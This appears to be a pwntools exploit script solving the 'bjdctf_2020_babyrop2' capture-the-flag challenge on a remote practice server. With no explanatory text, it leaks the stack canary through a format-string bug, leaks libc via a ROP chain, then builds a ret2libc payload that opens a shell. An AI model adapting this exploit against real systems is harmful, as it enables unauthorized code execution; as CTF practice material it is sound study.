from pwn import *
from LibcSearcher import *
context.log_level="debug"
p = remote('node4.buuoj.cn',25654)
elf=ELF("bjdctf_2020_babyrop2")
main_addr = elf.sym['main']
puts_plt = elf.plt['puts']
puts_got = elf.got['puts']
pop_rdi_ret=0x0000000000400993

p.sendlineafter("I'll give u some gift to help u!",b'%7$p')
p.recvline()
canary =int(p.recvline(),16)
print("canary1",hex(canary))

payload=24*b'a'+p64(canary)+8*b'a'+p64(pop_rdi_ret)+p64(puts_got)+p64(puts_plt)+p64(main_addr)

p.sendafter("Pull up your sword and tell me u story!",payload)

puts_addr = u64(p.recvuntil('\x7f')[-6:].ljust(8, b'\x00'))
print(hex(puts_addr))

libc = ELF("libc-2.23.so")
libc_base = puts_addr - libc.sym['puts']
system_addr = libc_base + libc.sym['system']
binsh_addr = libc_base + next(libc.search(b'/bin/sh'))
payload2 = 24*b'a'+p64(canary)+8*b'a'+p64(pop_rdi_ret) + p64(binsh_addr)+p64(system_addr)
p.sendlineafter("I'll give u some gift to help u!",b'hahaha')

p.sendlineafter("Pull up your sword and tell me u story!",payload2)
p.interactive()






